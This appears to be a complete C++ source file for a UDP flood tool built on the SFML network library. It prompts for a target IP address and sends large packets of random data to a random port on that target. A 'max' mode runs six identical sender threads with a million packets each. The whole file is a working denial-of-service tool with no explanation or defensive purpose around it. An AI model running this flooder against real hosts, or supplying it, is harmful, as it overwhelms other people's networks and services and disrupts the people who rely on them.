#include <iostream>

#include <cstdlib>
#include <time.h>
#include <thread>

#include <SFML\Network.hpp>
#include <SFML\Main.hpp>

using namespace std;

void Udpsend(sf::IpAddress ip, int b = 1000000) {
	sf::UdpSocket socket;
	sf::Packet pak;
	unsigned short port = rand() % 65500;
	for (size_t i = 0; i < b; i++) {
		for (int i = 0; pak.getDataSize() < 6000; i++)
		{
			pak << rand();
		}
		socket.send(pak, ip, port);
		pak.clear();
	}
}

void Udpsenda(sf::IpAddress ip, int b = 1000000) {
	sf::UdpSocket socket;
	sf::Packet pak;
	unsigned short port = rand() % 65500;
	for (size_t i = 0; i < b; i++) {
		for (int i = 0; pak.getDataSize() < 6000; i++)
		{
			pak << rand();
		}
		socket.send(pak, ip, port);
		pak.clear();
	}
}
void Udpsendb(sf::IpAddress ip, int b = 1000000) {
	sf::UdpSocket socket;
	sf::Packet pak;
	unsigned short port = rand() % 65500;
	for (size_t i = 0; i < b; i++) {
		for (int i = 0; pak.getDataSize() < 6000; i++)
		{
			pak << rand();
		}
		socket.send(pak, ip, port);
		pak.clear();
	}
}
void Udpsendc(sf::IpAddress ip, int b = 1000000) {
	sf::UdpSocket socket;
	sf::Packet pak;
	unsigned short port = rand() % 65500;
	for (size_t i = 0; i < b; i++) {
		for (int i = 0; pak.getDataSize() < 6000; i++)
		{
			pak << rand();
		}
		socket.send(pak, ip, port);
		pak.clear();
	}
}
void Udpsendd(sf::IpAddress ip, int b = 1000000) {
	sf::UdpSocket socket;
	sf::Packet pak;
	unsigned short port = rand() % 65500;
	for (size_t i = 0; i < b; i++) {
		for (int i = 0; pak.getDataSize() < 6000; i++)
		{
			pak << rand();
		}
		socket.send(pak, ip, port);
		pak.clear();
	}
}
void Udpsende(sf::IpAddress ip, int b = 1000000) {
	sf::UdpSocket socket;
	sf::Packet pak;
	unsigned short port = rand() % 65500;
	for (size_t i = 0; i < b; i++) {
		for (int i = 0; pak.getDataSize() < 6000; i++)
		{
			pak << rand();
		}
		socket.send(pak, ip, port);
		pak.clear();
	}
}




int main() {
	srand(time(NULL));

	cout << "1 - UDP packet" << endl << "3 - Max internet usage" << endl;

	int a, b;

	cin >> a;

	sf::IpAddress ip;

	cout << "enter ip" << endl;

	cin >> ip;

	cout << "entered ip:  " << ip.toString() << endl;
	if (a != 3) {
		cout << "enter amount " << endl;

		cin >> b;

		///////////UDP///////////
		
		if (a == 1) {
			Udpsend(ip, b);
		}
	}
	else {


		//////////////////////////////////MAX///////////////////////////////




		thread a(Udpsend, ip.toString(), 1000000);
		thread b(Udpsenda, ip.toString(), 1000000);
		thread c(Udpsendb, ip.toString(), 1000000);
		thread d(Udpsendc, ip.toString(), 1000000);
		thread e(Udpsendd, ip.toString(), 1000000);
		thread f(Udpsende, ip.toString(), 1000000);
		a.join();
	}

	cout << "end" << endl;

	system("PAUSE");

}
